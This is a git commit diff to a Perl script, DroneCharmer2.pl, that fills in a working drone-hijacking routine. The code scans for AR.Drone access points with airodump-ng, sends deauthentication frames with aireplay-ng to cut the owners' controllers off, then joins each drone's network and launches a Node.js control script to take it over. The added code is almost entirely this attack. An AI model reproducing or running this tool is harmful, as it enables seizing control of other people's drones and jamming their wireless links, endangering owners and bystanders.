ea3b9a02168fea3e8115a046dcda557f79185522
Tyler Crum <17105451+tukru@users.noreply.github.com>
2023-08-10 23:41:01 +0000

    Update DroneCharmer2.pl

--- DroneCharmer2.pl
+++ DroneCharmer2.pl
@@ -18,6 +18,9 @@ my $aireplay = "aireplay-ng";
 my $airodump = "airodump-ng";
 my $nodejs   = "nodejs";
 
+my $tmpfile = "/tmp/dronestrike";
+my %skyjacked;
+
 sub sudo {
     print "Running: @_\n";
     system("sudo", @_);
@@ -25,12 +28,58 @@ sub sudo {
 
 sub monitor_mode {
     sudo($ifconfig, $interface, "down");
-    # Additional code to set monitor mode
+    sudo($airmon, "start", $interface);
 }
-
-# ... Rest of the code for scanning, deauthenticating, connecting, and taking over ...
 
 while (1) {
     monitor_mode();
-    # ... Rest of the code ...
+
+    eval {
+        local $SIG{INT} = sub { die };
+        my $pid = open(DUMP, "|sudo $airodump --output-format csv -w $tmpfile $interface >>/dev/null 2>>/dev/null") || die "Can't run airodump ($airodump): $!";
+        sleep 2;
+        sudo("kill", $pid);
+        sleep 1;
+        sudo("killall", "-9", $aireplay, $airodump);
+        close(DUMP);
+    };
+
+    sleep 4;
+    my %clients;
+    my %chans;
+    foreach my $tmpfile1 (glob("$tmpfile*.csv")) {
+        open(APS, "<$tmpfile1") || print "Can't read tmp file $tmpfile1: $!";
+        while (<APS>) {
+            s/[\0\r]//g;
+            foreach my $dev (@drone_macs) {
+                if (/^($dev:[\w:]+),\s+\S+\s+\S+\s+\S+\s+\S+\s+(\d+),.*(ardrone\S+),/) {
+                    $chans{$1} = [$2, $3];
+                }
+                if (/^([\w:]+).*\s($dev:[\w:]+),/) {
+                    $clients{$1} = $2;
+                }
+            }
+        }
+        close(APS);
+        sudo("rm", $tmpfile1);
+    }
+
+    foreach my $cli (keys %clients) {
+        sudo($iwconfig, $interface, "channel", $chans{$clients{$cli}}[0]);
+        sudo($aireplay, "-0", "3", "-a", $clients{$cli}, "-c", $cli, $interface);
+    }
+
+    foreach my $drone (keys %chans) {
+        next if $skyjacked{$chans{$drone}[1]}++;
+        sudo($iwconfig, $interface2, "essid", $chans{$drone}[1]);
+        sudo($dhclient, "-v", $interface2);
+        sudo($nodejs, $controljs);
+    }
+
+    sleep 5;
+}
+
+sub sudo {
+    print "Running: @_\n";
+    system("sudo", @_);
 }
